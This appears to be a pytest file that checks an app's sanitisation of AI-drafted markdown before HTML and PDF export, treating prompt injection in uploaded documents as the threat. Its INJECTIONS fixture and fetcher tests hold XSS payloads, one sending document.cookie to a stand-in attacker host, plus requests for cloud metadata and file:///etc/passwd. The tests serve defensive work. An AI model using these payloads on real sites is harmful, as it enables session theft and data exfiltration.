"""Deliverable export: model-authored markdown must not become live HTML.

Section bodies are written by a model from third-party uploaded documents, so
they are untrusted input that travels to two dangerous places: an HTML response
on the app origin (which carries the reviewer's session cookie) and WeasyPrint's
PDF renderer (which will fetch `http(s)://` and `file://` resources by default).

The approval gate does not help here — the review UI renders markdown as React
nodes, so raw tags look like inert text to an approver and only become live in
the export.

WeasyPrint cannot load its native libraries in a bare venv, so the PDF tests
inject a fake `weasyprint` module that captures the document and the
`url_fetcher` tret passes in, then drives that fetcher over every resource
reference in the document. That checks the property that matters (no reference
in a rendered deliverable can produce a fetch) without needing pango installed.
"""
from __future__ import annotations

import sys
import types
import uuid
from datetime import datetime, timezone
from html.parser import HTMLParser

import pytest

from tret.services import export as export_module
from tret.services.export import (
    ExternalResourceBlocked,
    assemble_deliverable,
    blocked_url_fetcher,
    render_pdf,
)
from tret.services.html_sanitize import is_safe_url, render_markdown

# The canonical injection payload set: what a prompt injection in an uploaded
# ESG questionnaire would try to get into a drafted section.
INJECTIONS = {
    "script_tag": "<script>alert(document.domain)</script>",
    "img_onerror": '<img src=x onerror="fetch(\'https://attacker/x?d=\'+document.cookie)">',
    "svg_onload": '<svg onload="alert(1)"></svg>',
    "iframe": '<iframe src="https://attacker/frame"></iframe>',
    "js_link": "[click here](javascript:alert(document.domain))",
    "js_link_entity": "[click here](&#106;avascript:alert%281%29)",
    "js_link_case": "[click here](JaVaScRiPt:alert(1))",
    "js_link_whitespace": "[click here](java\tscript:alert(1))",
    "data_link": "[click here](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)",
    "form": '<form action="https://attacker/steal"><input name="x"></form>',
    "body_onload": "<body onload=alert(1)>",
    "style_block": "<style>body{background:url('https://attacker/beacon')}</style>",
}


# ── how "neutralized" is judged ──────────────────────────────────────────────
# Substring checks are not good enough here: `&lt;img src=x onerror=alert(1)&gt;`
# contains "onerror=" and is completely inert. What matters is what a browser's
# parser sees, so these tests parse the output and assert on real elements.
DANGEROUS_TAGS = frozenset(
    {"script", "iframe", "svg", "form", "object", "embed", "link", "meta", "base", "input"}
)


class _Elements(HTMLParser):
    def __init__(self):
        super().__init__(convert_charrefs=True)
        self.elements: list[tuple[str, dict]] = []

    def handle_starttag(self, tag, attrs):
        self.elements.append((tag.lower(), {k.lower(): (v or "") for k, v in attrs}))

    handle_startendtag = handle_starttag


def parse_elements(html: str) -> list[tuple[str, dict]]:
    parser = _Elements()
    parser.feed(html)
    parser.close()
    return parser.elements


def assert_inert(html: str, *, allow_tags: frozenset = frozenset()) -> None:
    """No element a browser would treat as executable or fetchable-by-script."""
    for tag, attrs in parse_elements(html):
        if tag in allow_tags:
            continue
        assert tag not in DANGEROUS_TAGS, f"<{tag}> survived parsing of {html!r}"
        assert tag != "style", f"<style> survived parsing of {html!r}"
        for name, value in attrs.items():
            assert not name.startswith("on"), f"{tag}[{name}] survived in {html!r}"
            assert name != "style", f"{tag}[style] survived in {html!r}"
            if name in ("href", "src", "srcset", "action"):
                assert is_safe_url(value), f"{tag}[{name}]={value!r} survived in {html!r}"


# ── the renderer: injection is neutralized ───────────────────────────────────
@pytest.mark.parametrize("name", sorted(INJECTIONS))
def test_injected_html_never_survives_as_markup(name):
    html = render_markdown(f"Some legitimate narrative.\n\n{INJECTIONS[name]}\n\nMore narrative.")
    assert_inert(html)
    # The narrative around the payload is untouched, so a reviewer still sees
    # the section — the payload is just inert.
    assert "Some legitimate narrative." in html


def test_raw_html_becomes_visible_text_rather_than_vanishing():
    """Escaped, not stripped: an injection attempt stays visible in the audit
    record instead of being silently deleted from the deliverable."""
    html = render_markdown("<script>alert(1)</script>")
    assert "&lt;script&gt;" in html
    assert "alert(1)" in html


def test_unsafe_link_targets_are_dropped_but_link_text_remains():
    html = render_markdown("[click here](javascript:alert(1))")
    assert "href" not in html
    assert "click here" in html


def test_remote_and_local_image_sources():
    # A file:// image is a local-file read attempt: the src is dropped outright.
    assert "src" not in render_markdown("![x](file:///etc/passwd)")
    # http(s) images keep their src (they are ordinary markdown), and the PDF
    # renderer refuses to fetch them — see the url_fetcher tests below.
    assert 'src="https://cdn.example.com/chart.png"' in render_markdown(
        "![chart](https://cdn.example.com/chart.png)"
    )


def test_is_safe_url_allows_relative_and_named_schemes_only():
    for ok in ["./a.html", "../a.html", "#section", "a/b?c=1", "https://x.test/a", "mailto:a@b.c"]:
        assert is_safe_url(ok), ok
    for bad in ["javascript:alert(1)", "JAVASCRIPT:alert(1)", "data:text/html,x", "vbscript:x",
                "file:///etc/passwd", "\tjavascript:alert(1)", ""]:
        assert not is_safe_url(bad), bad


# ── the renderer: legitimate formatting survives ─────────────────────────────
LEGIT = """## Governance

The board reviews **transition risk** quarterly, per *TCFD*.

| Scope | tCO2e | Basis |
|-------|-------|-------|
| 1 | 12,400 | metered |
| 2 | 3,100 | market |

- Physical risk: material
- Transition risk: material

> Disclosure is incomplete for Scope 3.

See [the methodology](https://example.test/method) and `emissions.csv`.

1. First
2. Second
"""


def test_legitimate_formatting_is_preserved():
    html = render_markdown(LEGIT)
    for expected in [
        "<h2>Governance</h2>",
        "<strong>transition risk</strong>",
        "<em>TCFD</em>",
        "<table>",
        "<th>Scope</th>",
        "<td>12,400</td>",
        "<ul>",
        "<ol>",
        "<li>First</li>",
        "<blockquote>",
        "<code>emissions.csv</code>",
        '<a href="https://example.test/method">the methodology</a>',
    ]:
        assert expected in html, expected


# ── the assembled deliverable goes through the sanitizer ─────────────────────
class _FakeResult:
    def __init__(self, rows):
        self._rows = rows

    def scalars(self):
        return self

    def all(self):
        return self._rows

    def first(self):
        return self._rows[0] if self._rows else None


class _FakeDb:
    """Just enough AsyncSession to drive assemble_deliverable offline.

    Dispatches on the entity being selected, so it does not care about the
    order or shape of the WHERE clauses.
    """

    def __init__(self, findings, runs=()):
        self._by_entity = {"Finding": list(findings), "Run": list(runs)}

    async def execute(self, statement):
        entity = statement.column_descriptions[0]["entity"].__name__
        return _FakeResult(self._by_entity.get(entity, []))


def _section_finding(markdown: str, section: str = "governance") -> object:
    from tret.db.models import Finding

    return Finding(
        id=uuid.uuid4(),
        run_id=None,
        project_id=uuid.uuid4(),
        schema_slug="draft_section",
        subject={"deliverable": "tcfd-assessment", "section": section},
        payload={"markdown": markdown},
        provenance={"model": "anthropic/claude-sonnet-5", "doctrine_sha": "abc123def456789"},
        status="approved",
        created_at=datetime.now(timezone.utc),
    )


async def test_assembled_html_is_sanitized_end_to_end():
    """The wiring, not just the renderer: a finding whose markdown carries a
    payload produces an assembled `html` with nothing executable in it."""
    body = f"Narrative text.\n\n{INJECTIONS['script_tag']}\n\n{INJECTIONS['img_onerror']}"
    db = _FakeDb([_section_finding(body)])
    result = await assemble_deliverable(db, uuid.uuid4(), "tcfd-assessment")

    assert "Narrative text." in result["html"]
    assert_inert(result["html"])
    # The markdown copy is the verbatim audit record and is NOT rewritten — it
    # is served as text/plain, never as HTML.
    assert "<script>" in result["markdown"]


# ── WeasyPrint may not fetch anything ────────────────────────────────────────
def test_blocked_url_fetcher_refuses_remote_and_local_schemes():
    for url in [
        "https://attacker.test/beacon.png",
        "http://169.254.169.254/latest/meta-data/",
        "file:///etc/passwd",
        "ftp://internal/x",
        "//attacker.test/x",
        "/etc/passwd",
    ]:
        with pytest.raises(ExternalResourceBlocked):
            blocked_url_fetcher(url)


class _FakeHTML:
    """Stands in for weasyprint.HTML, and exercises the fetcher it was given."""

    captured: dict = {}

    def __init__(self, string=None, url_fetcher=None, **kwargs):
        _FakeHTML.captured = {"string": string, "url_fetcher": url_fetcher}

    def write_pdf(self):
        return b"%PDF-1.7 fake"


@pytest.fixture()
def fake_weasyprint(monkeypatch):
    module = types.ModuleType("weasyprint")
    module.HTML = _FakeHTML
    monkeypatch.setitem(sys.modules, "weasyprint", module)
    _FakeHTML.captured = {}
    return module


def _resource_urls(document: str) -> list[str]:
    import re

    return re.findall(r'(?:src|href)="([^"]+)"', document) + re.findall(
        r"url\(['\"]?([^'\")]+)", document
    )


def test_pdf_render_passes_the_blocking_fetcher_and_no_reference_can_fetch(fake_weasyprint):
    body = render_markdown(
        "![beacon](https://attacker.test/x.png)\n\n"
        "![local](file:///etc/passwd)\n\n"
        "[link](https://example.test/ok)\n\n"
        f"{INJECTIONS['style_block']}\n"
    )
    pdf = render_pdf(body, "tcfd-assessment", [_provenance_row()], "abc123def4567890")
    assert pdf == b"%PDF-1.7 fake"

    document = _FakeHTML.captured["string"]
    fetcher = _FakeHTML.captured["url_fetcher"]
    assert fetcher is blocked_url_fetcher

    # file:// never even reaches the document, and every reference that did
    # survive is refused when the renderer tries to load it.
    assert "file:///etc/passwd" not in document
    refs = _resource_urls(document)
    assert "https://attacker.test/x.png" in refs  # the img src did survive sanitization
    for url in refs:
        with pytest.raises(ExternalResourceBlocked):
            fetcher(url)


def _provenance_row() -> dict:
    return {
        "section": "governance",
        "status": "approved",
        "model": "anthropic/claude-sonnet-5",
        "doctrine_sha": "abc123def456",
        "energy_wh": 1.25,
        "co2e_g": 0.4,
    }


def test_provenance_cells_are_escaped(fake_weasyprint):
    """Section slugs are model-chosen and land in hand-built HTML."""
    hostile = dict(_provenance_row())
    hostile["section"] = "governance<script>alert(1)</script>"
    hostile["model"] = '"><img src=x onerror=alert(1)>'
    render_pdf("<p>body</p>", "tcfd-assessment", [hostile], "<script>alert(1)</script>")

    document = _FakeHTML.captured["string"]
    # `style`/`meta` are tret's own print stylesheet and charset declaration;
    # nothing from the section data may appear as markup.
    assert_inert(document, allow_tags=frozenset({"style", "meta"}))
    assert "&lt;script&gt;" in document  # escaped, so still visible in the audit


# ── the HTML export response ─────────────────────────────────────────────────
def _export_client(findings):
    """The findings router with auth stubbed and an offline fake session."""
    from fastapi import FastAPI
    from fastapi.testclient import TestClient

    from tret.api import findings as findings_api
    from tret.api.auth import current_user
    from tret.api.workspace import WorkspaceContext, current_workspace
    from tret.db.engine import get_db
    from tret.db.models import Project, Workspace

    project = Project(id=uuid.uuid4(), workspace_id=uuid.uuid4(), name="p")
    db = _FakeDb(findings, runs=())
    db._by_entity["Project"] = [project]

    app = FastAPI()
    app.include_router(findings_api.router)
    app.dependency_overrides[current_user] = lambda: None
    app.dependency_overrides[current_workspace] = lambda: WorkspaceContext(
        Workspace(id=project.workspace_id, name="W", kind="team"), "owner"
    )
    app.dependency_overrides[get_db] = lambda: db
    return TestClient(app)


def test_html_export_is_served_sandboxed_and_sanitized():
    """Second layer: even a future renderer regression cannot execute script on
    the app origin, because the response forbids it."""
    client = _export_client([_section_finding(f"Narrative.\n\n{INJECTIONS['script_tag']}")])
    response = client.get("/api/deliverables/tcfd-assessment/export?format=html")

    assert response.status_code == 200
    assert_inert(response.text)
    csp = response.headers["content-security-policy"]
    assert "sandbox" in csp
    assert "default-src 'none'" in csp
    assert response.headers["x-content-type-options"] == "nosniff"


def test_pdf_unavailable_is_still_reported_when_weasyprint_cannot_load(monkeypatch):
    """The 501 path must survive the url_fetcher change."""
    broken = types.ModuleType("weasyprint")

    def _raise(*a, **k):
        raise OSError("cannot load library 'libgobject-2.0-0'")

    broken.__getattr__ = _raise  # type: ignore[attr-defined]
    monkeypatch.setitem(sys.modules, "weasyprint", broken)
    with pytest.raises(export_module.PdfUnavailable):
        render_pdf("<p>x</p>", "d", [], None)
